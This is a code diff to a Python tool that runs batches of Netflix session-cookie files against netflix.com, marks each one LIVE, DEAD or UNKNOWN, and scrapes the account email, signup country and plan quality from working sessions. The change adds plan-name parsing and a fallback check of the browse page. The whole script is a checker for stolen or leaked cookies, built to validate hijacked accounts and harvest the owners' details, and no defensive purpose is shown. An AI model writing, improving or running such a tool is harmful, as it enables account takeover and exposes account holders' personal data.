@@ -2,6 +2,7 @@
 import requests
 import sys
 import os
+import re
 import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -79,6 +80,121 @@ def extract_json_value(text, key):
     return None
 
 
+def normalize_plan_name(value):
+    if not value:
+        return None
+    normalized = value.strip().lower()
+    if 'premium' in normalized:
+        return 'Premium'
+    if 'standard' in normalized:
+        return 'Standard'
+    if 'mobile' in normalized:
+        return 'Mobile'
+    if 'basic' in normalized:
+        return 'Basic'
+    return value.strip().title()
+
+
+def plan_quality_from_name(plan_name):
+    if not plan_name:
+        return None
+    plan_lower = plan_name.strip().lower()
+    if 'premium' in plan_lower:
+        return '4K'
+    if 'standard' in plan_lower:
+        return 'HD'
+    if 'mobile' in plan_lower:
+        return 'SD'
+    if 'basic' in plan_lower:
+        return 'SD'
+    if 'with ads' in plan_lower:
+        return 'HD'
+    return None
+
+
+def is_language_label(value):
+    if not value:
+        return False
+    low = value.lower()
+    language_terms = [
+        'english',
+        'português',
+        'portugues',
+        'español',
+        'spanish',
+        'français',
+        'french',
+        'deutsch',
+        'german',
+        'italiano',
+        'japanese',
+        'korean',
+        'brazil',
+        'brasil',
+        'latin america',
+        'latam',
+        'pt-br',
+        'ptbr',
+    ]
+    return any(term in low for term in language_terms)
+
+
+def extract_plan(text):
+    for key in (
+        'planName',
+        'planDescription',
+        'planNickname',
+        'membershipLevel',
+        'customerPlan',
+        'planType',
+        'planLabel',
+        'packageLabel',
+        'videoQuality',
+        'resolution',
+    ):
+        value = extract_json_value(text, key)
+        plan = normalize_plan_name(value)
+        if plan and not is_language_label(plan):
+            return plan
+
+    simple_patterns = [
+        'Premium With Ads',
+        'Standard With Ads',
+        'Mobile With Ads',
+        'Premium',
+        'Standard',
+        'Mobile',
+        'Basic',
+    ]
+    text_lower = text.lower()
+    for pattern in simple_patterns:
+        if pattern.lower() in text_lower:
+            return normalize_plan_name(pattern)
+
+    match = re.search(r'"(Basic|Standard|Premium|Mobile|Standard With Ads|Premium With Ads|Mobile With Ads)"', text)
+    if match:
+        return normalize_plan_name(match.group(1))
+
+    match = re.search(r'plan[^\n\r\"]*[:=][^\n\r\"]*(Basic|Standard|Premium|Mobile)', text, re.IGNORECASE)
+    if match:
+        return normalize_plan_name(match.group(1))
+
+    return None
+
+
+def extract_plan_quality(text):
+    plan_name = extract_plan(text)
+    return plan_quality_from_name(plan_name)
+
+
+def extract_account_info(text):
+    info = {}
+    info['email'] = extract_json_value(text, 'userEmail')
+    info['quality'] = extract_plan_quality(text)
+    info['country'] = extract_json_value(text, 'countryOfSignup')
+    return info
+
+
 def check_cookie(filepath):
     with open(filepath, 'r', errors='ignore') as f:
         content = f.read()
@@ -101,15 +217,8 @@ def check_cookie(filepath):
         r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=False)
 
         if r.status_code == 200:
-            info = {}
-            text = r.text
-            try:
-                info['email'] = extract_json_value(text, 'userEmail')
-                info['plan'] = extract_json_value(text, 'planName') or extract_json_value(text, 'planDescription') or extract_json_value(text, 'planNickname')
-                info['country'] = extract_json_value(text, 'countryOfSignup')
-            except:
-                pass
-            if info or 'profileName' in text or 'memberSince' in text:
+            info = extract_account_info(r.text)
+            if info or 'profileName' in r.text or 'memberSince' in r.text:
                 return filepath, 'LIVE', 'Active account', info
 
         if r.status_code == 302:
@@ -117,14 +226,23 @@ def check_cookie(filepath):
             if '/login' in loc or 'login' in loc:
                 return filepath, 'DEAD', 'Expired - redirect to login', {}
             if '/browse' in loc:
-                return filepath, 'LIVE', 'Active (redirect to browse)', {}
+                browse_reason = 'Active (redirect to browse)'
+            else:
+                browse_reason = None
+        else:
+            browse_reason = None
 
         # Check 2: Browse page fallback
         r2 = session.get('https://www.netflix.com/browse', headers=headers, timeout=20, allow_redirects=False)
         if r2.status_code == 200 and 'profiles' in r2.text.lower():
-            return filepath, 'LIVE', 'Active', {}
+            info = extract_account_info(r2.text)
+            return filepath, 'LIVE', 'Active', info
         if r2.status_code == 302 and '/login' in r2.headers.get('Location', ''):
             return filepath, 'DEAD', 'Expired', {}
+
+        if browse_reason:
+            return filepath, 'LIVE', browse_reason, {}
+        return filepath, 'UNKNOWN', f'HTTP {r.status_code}', {}
 
         return filepath, 'UNKNOWN', f'HTTP {r.status_code}', {}
 
@@ -191,10 +309,10 @@ def main():
                 extras = ''
                 if info:
                     parts = []
+                    if info.get('quality'):
+                        parts.append(info['quality'])
                     if info.get('email'):
                         parts.append(info['email'])
-                    if info.get('plan'):
-                        parts.append(info['plan'])
                     if info.get('country'):
                         parts.append(info['country'])
                     extras = ' | ' + ' | '.join(parts)
